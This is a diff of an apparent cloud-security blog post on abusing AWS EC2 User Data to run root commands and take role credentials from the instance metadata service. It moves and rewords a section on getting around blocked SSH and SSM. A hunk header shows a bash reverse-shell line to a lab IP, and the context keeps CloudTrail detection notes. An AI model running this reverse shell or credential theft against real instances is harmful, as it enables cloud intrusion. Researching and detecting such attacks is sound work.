@@ -152,6 +152,13 @@
           <p>On Linux, scripts specified in User Data are run as root by cloud-init. On Windows, EC2Launch executes PowerShell scripts automatically at first boot, also with administrative privileges. <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html" target="_blank">ref</a></p>
 
 
+          <h2 class="section-heading">Bypass Blocked SSH and SSM</h2>
+
+          <p>Typically, SSH keys or AWS Systems Manager (SSM) are used to administer EC2 instances. However, if those are disabled or inaccessible, an attacker who can supply or modify user data can still execute commands as root during instance startup.</p>
+
+          <p>From there, the attacker can query the Instance Metadata Service (IMDS) at the link-local address 169.254.169.254 to retrieve temporary AWS credentials for the role attached to the instance via its instance profile. These credentials are issued on demand by AWS STS (Security Token Service) and are accessible to any process running on the instance.</p>
+          
+
           <h2 class="section-heading">Demo Time</h2>
 
           <p>
@@ -286,12 +293,6 @@ bash -i >& /dev/tcp/172.31.34.136/60000 0>&1
             <li>Because these logs live in the S3 data events, if you are not collecting them you won't see the role being used outside of the EC2</li>
             <li>I could not find the Access Key: ASIAZ5UWVVHTJEKBDCJ3 in any other generic CloudTrail logs</li>
             <li>The EC2 User Data being set can be seen in the <inline-code>eventName: "ModifyInstanceAttribute"</inline-code> log by filtering for <inline-code>requestParameters.userData=*</inline-code>. The actual content of the User Data is redacted though, so can't be inspected for malicious content</li>
-
-          <h2 class="section-heading">Bypass Blocked SSH and SSM</h2>
-
-          <p>Typically, SSH keys or AWS Systems Manager (SSM) are used to administer EC2 instances. But if those are disabled or inaccessible, an attacker who can supply or modify user data can execute commands as root. This allows them to query the Instance Metadata Service (IMDS) over the local link address <inline-code>169.254.169.254</inline-code> to retrieve temporary AWS credentials for the instance’s attached role.</p>
-
-          <p>The EC2 instance itself does not store credentials permanently. Instead, IMDS fetches temporary credentials on-demand from AWS STS (Security Token Service) for the role attached via the instance profile. Any process running on the instance can reach IMDS via the link-local IP.</p>
 
           <h2 class="section-heading">Example Payloads</h2>
 
